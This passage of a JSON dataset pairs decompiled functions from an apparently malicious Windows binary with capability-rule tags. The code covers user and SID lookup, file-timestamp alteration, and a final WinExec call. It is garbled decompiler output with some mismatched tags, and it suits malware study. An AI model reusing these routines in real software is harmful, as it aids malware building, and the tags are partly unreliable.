{
    "00401090": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_31ch\n\nuint __cdecl fcn.00401090(uint arg_8h, uint noname_1, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    if ((*0x10 != 0x320 && 0x31b < &stack0xfffffffc) &&\n       (*0x10 == 0x320 || SBORROW4(&stack0xfffffffc, 0x31c) != &var_31ch < 0)) {\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems);\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        (*_sym.imp.MSVCRT.dll_fclose)();\n        return 1;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 457
    },
    "004014f0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004014f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407024, &lpBuffer, arg_8h);\n    fcn.00404280(&var_4h, &var_8h);\n    fcn.00401620(var_4h);\n    iVar1 = fcn.00404f00(&s, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.00401ca0(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 404
    },
    "00401170": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401191) overlaps instruction at (ram,0x0040118f)\n// \n\nbool fcn.00401170(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t unaff_EDI;\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    uStack8 = 0x104;\n    if ((&stack0xfffffffc < 0x10c || *0x10 == 0x110) || (&stack0xfffffffc >= 0x10c && *0x10 != 0x110)) {\n        in_EAX = &uStack8;\n    }\n    else {\n        *(unaff_EDI + -0x73) = *(unaff_EDI + -0x73) - &stack0xfffffeec;\n        puVar2 = &stack0xfffffffd;\n    }\n    iVar1 = fcn.00404810(0x80000002, 0x4072f0, 0x407330, puVar2 + -8, puVar2 + -0x10c, in_EAX);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(puVar2 + -0x10c, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 313
    },
    "00401250": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004012ed) overlaps instruction at (ram,0x004012ea)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.00401250(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint8_t extraout_DL;\n    uint *puVar4;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    uint32_t uVar5;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404a40(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00404a40(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    uVar5 = arg_20h + 0xa0;\n    arg_14h_00 = 0x20;\n    arg_ch_00 = arg_1ch;\n    while( true ) {\n        fcn.00404a40(arg_18h, arg_ch_00, arg_10h, arg_14h_00, uVar5);\n        uVar5 = arg_20h + 0xe0;\n        arg_14h_00 = 0x20;\n        arg_10h = arg_14h;\n        puVar1 = fcn.00404a40(arg_18h, arg_1ch, arg_14h, 0x20, uVar5);\n        if ((0xffffffeb < &stack0xfffffed0) ||\n           (uVar5 = uVar5 & 0xffff | arg_18h << 0x10,  0xffffffeb >= &stack0xfffffed0)) break;\n        pcVar2 = puVar1 + 1;\n        arg_ch_00 = 0xb7f8c08b;\n        if (&stack0xfffffee4 < *puVar1 || pcVar2 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar2 = *pcVar2 + pcVar2;\n        *(puVar1 + 0x6b) = *(puVar1 + 0x6b) + extraout_DL;\n        *(extraout_ECX + 0x56) = *(extraout_ECX + 0x56) & extraout_DL;\n    }\n    iVar3 = fcn.00401200();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar3;\n    }\n    puVar4 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_4h = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar3 = fcn.00404810(0x80000001);\n    if ((iVar3 != 0) && (iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar3 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 889
    },
    "004018f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401926) overlaps instruction at (ram,0x00401924)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004018f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = unaff_EDI;\n    uVar3 = unaff_ESI;\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        if ((iVar1 < -1) || (-2 < iVar1)) {\n            unaff_ESI = uVar3;\n            unaff_EDI = iVar2;\n        }\n        *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n        return unaff_ESI;\n    }\n    return 1;\n}\n",
        "token_count": 230
    },
    "00401ca0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401cc5) overlaps instruction at (ram,0x00401cc0)\n// \n\nuint fcn.00401ca0(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    char *pcVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    int32_t **ppiVar11;\n    char *pcVar12;\n    char *pcVar13;\n    uint *puVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    ulong uVar16;\n    char cStack560;\n    int32_t *apiStack559 [64];\n    uchar uStack300;\n    uint uStack299;\n    uchar auStack40 [20];\n    uint auStack20 [4];\n    char cVar4;\n    \n    puVar10 = &stack0xfffffffc;\n    iVar5 = 0x40;\n    piVar1 = NULL;\n    cStack560 = '\\0';\n    uStack300 = '\\0';\n    ppiVar11 = &cStack560 + 1;\n    while( true ) {\n        for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *ppiVar11 = piVar1;\n            ppiVar11 = ppiVar11 + 1;\n        }\n        *ppiVar11 = piVar1;\n        *(ppiVar11 + 2) = piVar1;\n        bVar15 = false;\n        puVar9 = &uStack300 + 1;\n        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *puVar9 = 0;\n        ppiVar11 = puVar9 + 3;\n        *(puVar9 + 2) = 0;\n        puVar2 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&cStack560, 0x104);\n        if ((bVar15) || (!bVar15)) break;\n        piVar1 = puVar2 + 1;\n        if (&stack0xfffffdc8 < *puVar2 || piVar1 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *piVar1 = *piVar1 + 1;\n        iVar5 = extraout_ECX;\n    }\n    uVar6 = 0xffffffff;\n    pcVar8 = &cStack560;\n    do {\n        pcVar12 = pcVar8;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar12 = pcVar8 + 1;\n        cVar4 = *pcVar8;\n        pcVar8 = pcVar12;\n    } while (cVar4 != '\\0');\n    uVar6 = ~uVar6;\n    puVar9 = pcVar12 + -uVar6;\n    puVar14 = &uStack300;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar14 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar14 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    uVar6 = 0xffffffff;\n    pcVar8 = 0x407048;\n    do {\n        pcVar12 = pcVar8;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar12 = pcVar8 + 1;\n        cVar4 = *pcVar8;\n        pcVar8 = pcVar12;\n    } while (cVar4 != '\\0');\n    uVar6 = ~uVar6;\n    iVar5 = -1;\n    pcVar8 = &uStack300;\n    do {\n        pcVar13 = pcVar8;\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        pcVar13 = pcVar8 + 1;\n        cVar4 = *pcVar8;\n        pcVar8 = pcVar13;\n    } while (cVar4 != '\\0');\n    puVar9 = pcVar12 + -uVar6;\n    puVar14 = pcVar13 + -1;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar14 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar14 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    uVar16 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack300, 0, auStack40);\n    uVar6 = param_2 + 1;\n    iVar5 = extraout_ECX_00;\n    puVar9 = param_2;\n    if (uVar6 == 0) {\n        uVar16 = fcn.00403d70(param_1);\n        puVar9 = uVar16;\n        uVar6 = puVar9 - param_2;\n        iVar5 = extraout_ECX_01;\n        if (uVar6 == 0) {\n            return 0;\n        }\n    }\n    pcVar8 = uVar16 >> 0x20;\n    puVar3 = uVar16;\n    bVar15 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n    if ((bVar15) || (!bVar15)) {\n        puVar3 = auStack20;\n    }\n    else {\n        out(*param_2, uVar16 >> 0x20);\n        do {\n            cVar4 = puVar3 >> 8;\n            in_AF = 9 < (puVar3 & 0xf) | in_AF;\n            puVar3 = CONCAT31(CONCAT21(puVar3 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar8);\n        piVar1 = puVar14 + pcVar8 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(iVar5 + -0x73) = puVar3;\n        puVar10 = &stack0xfffffffd;\n        LOCK();\n        param_2 = param_2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar9, puVar10 + -0x20, puVar10 + -0x18, puVar3);\n    if (param_2 == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar9);\n    }\n    return 1;\n}\n",
        "token_count": 1731
    },
    "00402f50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402fea) overlaps instruction at (ram,0x00402fe7)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402f50(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    ushort in_SS;\n    bool bVar5;\n    ushort uVar6;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    uVar6 = unaff_EBX >> 0x10;\n    iVar2 = fcn.00401e20();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00402210();\n    iVar2 = fcn.00404be0(0x74);\n    bVar5 = iVar2 == -1;\n    if (!bVar5) {\n        return 0;\n    }\n    uVar3 = fcn.004028f0();\n    *0x42240c = 1;\n    if ((bVar5) || (!bVar5)) {\n        iVar2 = fcn.004044d0();\n        if (iVar2 == 0) {\n            var_20h = 0;\n            var_80h._0_1_ = 0;\n            puVar4 = &var_1fh;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            var_60h._0_1_ = 0;\n            puVar4 = &var_80h + 1;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            var_40h._0_1_ = 0;\n            puVar4 = &var_60h + 1;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            puVar4 = &var_40h + 1;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            iVar2 = fcn.004019b0(&var_80h, &var_60h, &var_20h, &var_40h);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            iVar2 = fcn.004014f0(&var_20h);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            iVar2 = fcn.00404510(&var_80h, &var_60h, &var_20h, &var_40h);\n            return iVar2 != 0;\n        }\n        uVar3 = 0;\n    }\n    puVar1 = CONCAT22(uVar6, in_SS) + 0x5e;\n    *puVar1 = *puVar1;\n    return uVar3;\n}\n",
        "token_count": 859
    },
    "004044d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004044d0(void)\n\n{\n    uint32_t uVar1;\n    uchar *unaff_ESI;\n    bool bVar2;\n    unkbyte6 Var3;\n    \n    Var3 = fcn.00403d70(0x407010);\n    uVar1 = Var3;\n    bVar2 = uVar1 != 0xffffffff;\n    if (bVar2) {\n        if ((bVar2) && (!bVar2)) {\n            uVar1 = *0x4bb148d3 | 0xffffff00;\n            out(*unaff_ESI, Var3 >> 0x20);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "00404510": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045fe) overlaps instruction at (ram,0x004045fc)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404749)\n// WARNING: Removing unreachable block (ram,0x0040474e)\n// WARNING: Removing unreachable block (ram,0x004047c4)\n// WARNING: Removing unreachable block (ram,0x00404557)\n// WARNING: Removing unreachable block (ram,0x00404560)\n// WARNING: Removing unreachable block (ram,0x00404564)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404510(uchar *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    ushort extraout_DX;\n    char cVar5;\n    ushort uVar4;\n    uint *puVar6;\n    uchar *noname_0;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    uchar uVar9;\n    bool bVar10;\n    char cVar11;\n    char cVar12;\n    bool bVar13;\n    ulong uVar14;\n    unkbyte6 Var15;\n    uint arg_18h;\n    uint arg_1ch;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    puVar7 = &fcn.00404510::var_213h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uVar9 = 1;\n    s = 0;\n    puVar7 = &fcn.00404510::var_10fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    var_ch = 1;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&stack0xfffffeec, 0x407030);\n    noname_0 = arg_8h;\n    if ((!uVar9) && (uVar9)) {\n        noname_0 = arg_8h + 1;\n        out(*arg_8h, extraout_DX);\n    }\n    fcn.00403eb0(&fcn.00404510::var_4h, &fcn.00404510::var_8h);\n    arg_18h = var_4h;\n    arg_1ch = var_8h;\n    while( true ) {\n        uVar1 = fcn.00404ce0(noname_0, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n        bVar8 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n        if (uVar1 == 0) {\n            return 0;\n        }\n        if ((bVar8) && (!bVar8)) {\n            puVar7 = &stack0xfffffdd0;\n            cVar5 = '\\x1e';\n            do {\n                puVar6 = puVar6 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar6;\n                cVar5 = cVar5 + -1;\n            } while ('\\0' < cVar5);\n            iVar3 = in(0x78);\n            return iVar3;\n        }\n        uVar14 = fcn.00404f00(&stack0xfffffeec, var_4h, var_8h);\n        arg_14h = uVar14 >> 0x20;\n        if (uVar14 == 0) {\n            return 0;\n        }\n        cVar5 = uVar14 >> 0x28;\n        cVar12 = SBORROW1(cVar5, '6');\n        cVar11 = cVar5 + -0x36 < '\\0';\n        bVar8 = cVar5 == '6';\n        arg_1ch = 0x404670;\n        arg_18h = extraout_ECX;\n        uVar14 = fcn.00401b10();\n        arg_10h = uVar14 >> 0x20;\n        if ((bVar8 || cVar12 != cVar11) || (!bVar8 && cVar12 == cVar11)) break;\n        in_AF = 9 < (uVar14 & 0xf) | in_AF;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        arg_ch = uVar14 & 0xffff0000 | (uVar14 >> 8) + in_AF << 8 | uVar14 + in_AF * '\\x06' & 0xf | 0x51;\n    }\n    iVar3 = fcn.00404be0();\n    if (iVar3 == -1) {\n        Var15 = fcn.00404be0();\n        uVar4 = Var15 >> 0x20;\n        iVar3 = Var15;\n        bVar8 = iVar3 != -1;\n        bVar13 = SBORROW4(iVar3, -1);\n        bVar10 = iVar3 == -1;\n        if (bVar10) goto code_r0x004046f6;\n    }\n    Var15 = fcn.004014b0(arg_8h);\n    uVar4 = Var15 >> 0x20;\n    if (Var15 != 0) {\n        fcn.00401fd0();\n        fcn.00404800();\n        return 1;\n    }\n    bVar8 = false;\n    bVar13 = false;\n    bVar10 = *0x422408 == 0;\n    if (bVar10) {\n        return 0;\n    }\ncode_r0x004046f6:\n    if ((!bVar13) && (bVar13)) {\n        uVar9 = in(uVar4);\n        *(puVar7 + 3) = uVar9;\n        if (bVar8 || bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar2 = fcn.00404b60(arg_8h, &stack0xfffffeec);\n    iVar3 = var_ch;\n    if (iVar2 == 0) {\n        iVar3 = 0;\n    }\n    if ((iVar3 != 0) && (iVar2 = fcn.00403e40(arg_8h),  iVar2 == 0)) {\n        var_ch = 0;\n        iVar3 = iVar2;\n    }\n    if (iVar3 == 0) {\n        iVar3 = fcn.00403bf0(arg_8h, 0);\n        var_ch = iVar3;\n    }\n    bVar8 = false;\n    if (iVar3 != 0) {\n        fcn.00404800();\n        bVar8 = SCARRY4(&stack0xfffffdcc, 4);\n    }\n    if ((bVar8) || (!bVar8)) {\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c);\n    return iVar3;\n}\n",
        "token_count": 1800
    },
    "00404be0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404cc8) overlaps instruction at (ram,0x00404cc7)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint fcn.00404be0(uint *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    char extraout_DH;\n    uchar *arg_18h;\n    uint32_t unaff_EBX;\n    char *pcVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    bool bVar13;\n    ulong uVar14;\n    unkbyte6 Var15;\n    uchar uVar16;\n    uchar uVar17;\n    ushort uVar18;\n    uchar uVar19;\n    uchar uVar20;\n    ushort uVar21;\n    uint uVar22;\n    uint uStack304;\n    uint auStack300 [65];\n    uchar uStack40;\n    uint auStack39 [7];\n    int32_t iStack8;\n    \n    puVar9 = &stack0xfffffffc;\n    uVar21 = 2;\n    uVar20 = 0;\n    uVar22 = 0;\n    iStack8 = 0xffffffff;\n    puVar4 = (**0x422410)();\n    if (puVar4 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    uStack304 = 0x128;\n    puVar11 = auStack300;\n    for (iVar5 = 0x49; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uVar17 = SUB41(&uStack304, 0);\n    uVar18 = &uStack304 >> 8;\n    uVar19 = &uStack304 >> 0x18;\n    uVar16 = puVar4 >> 0x18;\n    uVar10 = puVar4 << 8;\n    iVar5 = (**0x422414)();\n    do {\n        if (iVar5 == 0) {\ncode_r0x00404cc6:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar4);\n            return iStack8;\n        }\n        uVar7 = (unaff_EBX >> 8 & 0xffff00) << 8;\n        uVar2 = unaff_EBX & 0xffff;\n        unaff_EBX = uVar7 | uVar2;\n        uVar10 = uVar10 & 0xffffff00;\n        Var15 = (*_sym.imp.MSVCRT.dll__stricmp)(0xf4, param_1);\n        bVar13 = Var15 == 0;\n        if (bVar13) {\n            if ((bVar13) || (!bVar13)) {\n                iStack8 = auStack300[1];\n            }\n            else {\n                uVar1 = in(Var15 >> 0x20);\n                *param_1 = uVar1;\n                if (&stack0xfffffeb4 < 1) {\n                    iStack8 = fcn.00403db0(CONCAT13(uVar16, uVar10 >> 8), CONCAT22(uVar18, CONCAT11(uVar17, uVar16)), \n                                           CONCAT13(uVar20, CONCAT21(uVar21, uVar19)), uVar22);\n                    iVar8 = *0x10 + -0x13d;\n                    bVar13 = iStack8 == 0;\n                    if (bVar13) {\n                        return 0;\n                    }\n                    if ((bVar13) || (!bVar13)) {\n                        uVar7 = uVar7 | uVar2;\n                        iVar8 = 0;\n                        uStack40 = 0;\n                        puVar4 = auStack39;\n                        for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *puVar4 = 0;\n                            puVar4 = puVar4 + 1;\n                        }\n                    }\n                    else {\n                        param_1[1] = *puVar4;\n                        uVar10 = CONCAT11(0xdf, uVar2);\n                        pcVar6 = uVar7 | uVar10;\n                        puVar9 = 0xb9e181d0;\n                        *pcVar6 = *pcVar6 + extraout_DH;\n                        *0xffa85f4d = *0xffa85f4d >> 4 | *0xffa85f4d << 4;\n                        uVar7 = uVar7 | uVar10 & 0xffffff00 | uVar2 + extraout_DH;\n                        puVar4 = param_1 + 3;\n                        param_1[2] = &stack0xfffffec3;\n                    }\n                    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n                    *puVar4 = iVar8;\n                    *(puVar4 + 2) = iVar8;\n                    uVar10 = 0;\n                    do {\n                        uVar14 = (*pcVar3)();\n                        arg_18h = uVar14 >> 0x20;\n                        puVar9[uVar10 - 0x24] = uVar14;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 < 0x20);\n                    uVar20 = extraout_ECX_00;\n                    uVar21 = extraout_ECX_00 >> 8;\n                    uVar16 = extraout_ECX_00 >> 0x18;\n                    bVar13 = extraout_ECX_00 >> 8 == '\\x06';\n                    puVar4 = *(puVar9 + -4);\n                    puVar11 = puVar9 + -0x24;\n                    puVar12 = puVar4;\n                    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar12 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar12 = puVar12 + 1;\n                    }\n                    if ((bVar13) || (!bVar13)) {\n                        iVar5 = *(puVar9 + 0x10);\n                        puVar4 = *(puVar9 + 0x14);\n                        arg_18h = puVar9 + -0x24;\n                        uVar20 = 0x20;\n                        uVar21 = 0;\n                        uVar16 = 0;\n                    }\n                    else {\n                        uVar22 = in(uVar14 >> 0x20);\n                        *puVar12 = uVar22;\n                        if (&stack0xfffffec3 < 1) {\n                            *puVar11 = 0;\n                            *puVar4 = *puVar4 + puVar4;\n                            *(puVar4 + -0x46) = *(puVar4 + -0x46) + (uVar14 >> 0x28);\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                    }\n                    uVar10 = puVar4 ^ 0xdee0ed6d;\n                    *(uVar7 + 0x8b50104d) = *(uVar7 + 0x8b50104d) ^ iVar5;\n                    fcn.00401250(*(puVar9 + 9), *(puVar9 + 0xd), iVar5, \n                                 uVar10 & 0xffff0000 | uVar10 + (uVar10 >> 8) * -0x31 + 0x8d, arg_18h, puVar9 + 1, \n                                 CONCAT13(uVar16, CONCAT21(uVar21, uVar20)));\n                    fcn.00401940(*(puVar9 + 0x19), *(puVar9 + 0x1d));\n                    return 1;\n                }\n                *(unaff_EBX - 0x1237b) = *(unaff_EBX - 0x1237b) ^ extraout_ECX;\n                *(extraout_ECX + -0xa903bb) = *(extraout_ECX + -0xa903bb) + -1;\n            }\n            goto code_r0x00404cc6;\n        }\n        uVar10 = uVar10 & 0xffffff00;\n        iVar5 = (**0x422418)(puVar4, 0xd0);\n    } while( true );\n}\n",
        "token_count": 1879
    },
    "00404f00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
